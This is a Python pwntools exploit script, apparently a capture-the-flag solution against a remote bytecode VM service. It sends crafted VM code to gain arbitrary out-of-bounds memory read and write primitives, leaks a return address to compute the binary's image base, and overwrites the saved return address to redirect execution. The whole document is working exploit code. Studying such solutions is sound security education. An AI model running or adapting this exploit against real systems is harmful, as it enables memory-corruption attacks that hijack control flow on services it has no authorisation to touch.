import argparse

from pwn import *

debug = False

context.log_level = 'debug' if debug else 'info'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

read_all  = b'\x06\x01\x16\x11\x26\x21\x36\x31\x46\x41\x56\x51\x66\x61\x76\x71\x86\x81\x96\x91\xa6\xa1\xb6\xb1\xc6\xc1\xd6\xd1\xe6\xe1\xf6\xf1'
zero_all  = b'\x00\x01\x00\x11\x00\x21\x00\x31\x00\x41\x00\x51\x00\x61\x00\x71\x00\x81\x00\x91\x00\xa1\x00\xb1\x00\xc1\x00\xd1\x00\xe1\x00\xf1\x00'

SetReg = b'\x00'
Swap   = b'\x01'
Load   = b'\x02'
Store  = b'\x03'
Jmp    = b'\x04'
Skip   = b'\x05'
In     = b'\x06'
Out    = b'\x07'
Exit   = b'\x08'

In8 = In + In + In + In + In + In + In + In

r.sendafter(b'Debug?\n', b'\x01' if debug else '\x00')

code = (
    b''
  + read_all
  + Jmp

  + b"AA"
  + read_all + In8 + Store
  + read_all + In8 + Store
  + read_all + In8 + Store
  + read_all + In8 + Store
  + read_all + In8 + Store
  + read_all + In8 + Store
  + read_all + In8 + Store
  + read_all + In8 + Store
  + zero_all
  + Jmp

  + b"BB"
  + read_all + Load + Out
  + read_all + Load + Out
  + read_all + Load + Out
  + read_all + Load + Out
  + read_all + Load + Out
  + read_all + Load + Out
  + read_all + Load + Out
  + read_all + Load + Out
  + zero_all
  + Jmp

  + b"CC"
  + Exit
)

write_addr = code.index(b"AA") + 2
read_addr = code.index(b"BB") + 2
exit_addr = code.index(b"CC") + 2

print(f"read_addr={read_addr:#x}")
print(f"write_addr={write_addr:#x}")
print(f"exit_addr={exit_addr:#x}")

code += Exit * (4096 - len(code))
r.sendafter(b'Input vm code:\n', code)

bitswap = lambda x: (
    (((x >> 15) & 1) << 0)
  | (((x >> 14) & 1) << 1)
  | (((x >> 13) & 1) << 2)
  | (((x >> 12) & 1) << 3)
  | (((x >> 11) & 1) << 4)
  | (((x >> 10) & 1) << 5)
  | (((x >> 9) & 1) << 6)
  | (((x >> 8) & 1) << 7)
  | (((x >> 7) & 1) << 8)
  | (((x >> 6) & 1) << 9)
  | (((x >> 5) & 1) << 10)
  | (((x >> 4) & 1) << 11)
  | (((x >> 3) & 1) << 12)
  | (((x >> 2) & 1) << 13)
  | (((x >> 1) & 1) << 14)
  | (((x >> 0) & 1) << 15)
)

def read(addr):
    r.send(p16(bitswap(read_addr << 3)))

    off = addr << 3

    r.send(p16(bitswap(off + 0)))
    r.send(p16(bitswap(off + 1)))
    r.send(p16(bitswap(off + 2)))
    r.send(p16(bitswap(off + 3)))
    r.send(p16(bitswap(off + 4)))
    r.send(p16(bitswap(off + 5)))
    r.send(p16(bitswap(off + 6)))
    r.send(p16(bitswap(off + 7)))
    if debug:
      _ = r.recvuntil(b"char out: ")
    return r.recv(1)


def write(addr, value):
    r.send(p16(bitswap(write_addr << 3)))
    off = addr << 3

    r.send(p16(bitswap(off + 0)))
    r.send(b'\xff' if (value & (1 << 0) != 0) else b'\x00')
    r.send(p16(bitswap(off + 1)))
    r.send(b'\xff' if (value & (1 << 1) != 0) else b'\x00')
    r.send(p16(bitswap(off + 2)))
    r.send(b'\xff' if (value & (1 << 2) != 0) else b'\x00')
    r.send(p16(bitswap(off + 3)))
    r.send(b'\xff' if (value & (1 << 3) != 0) else b'\x00')
    r.send(p16(bitswap(off + 4)))
    r.send(b'\xff' if (value & (1 << 4) != 0) else b'\x00')
    r.send(p16(bitswap(off + 5)))
    r.send(b'\xff' if (value & (1 << 5) != 0) else b'\x00')
    r.send(p16(bitswap(off + 6)))
    r.send(b'\xff' if (value & (1 << 6) != 0) else b'\x00')
    r.send(p16(bitswap(off + 7)))
    r.send(b'\xff' if (value & (1 << 7) != 0) else b'\x00')


def exit():
    r.send(p16(bitswap(exit_addr << 3)))


def read8(addr):
    return (
        read(addr+0) +
        read(addr+1) +
        read(addr+2) +
        read(addr+3) +
        read(addr+4) +
        read(addr+5) +
        read(addr+6) +
        read(addr+7)
    )


def write8(addr, value):
    write(addr+0, value[0])
    write(addr+1, value[1])
    write(addr+2, value[2])
    write(addr+3, value[3])
    write(addr+4, value[4])
    write(addr+5, value[5])
    write(addr+6, value[6])
    write(addr+7, value[7])


# for i in range(0x1018, 0x1100, 8):
#     print(f'+{i:02x}: {u64(read8(i)):016x}')


main_addr = u64(read8(0x1038))
ret_addr = u64(read8(0x1028))

img_base = main_addr - 0x1fc4

print(f'return addr: {ret_addr:#x}')
print(f'img base: {img_base:#x}')

write8(0x1028, p64(img_base + 0x1290))
ret_addr = u64(read8(0x1028))
print(f'return addr now: {ret_addr:#x}')


input()
exit()


r.interactive()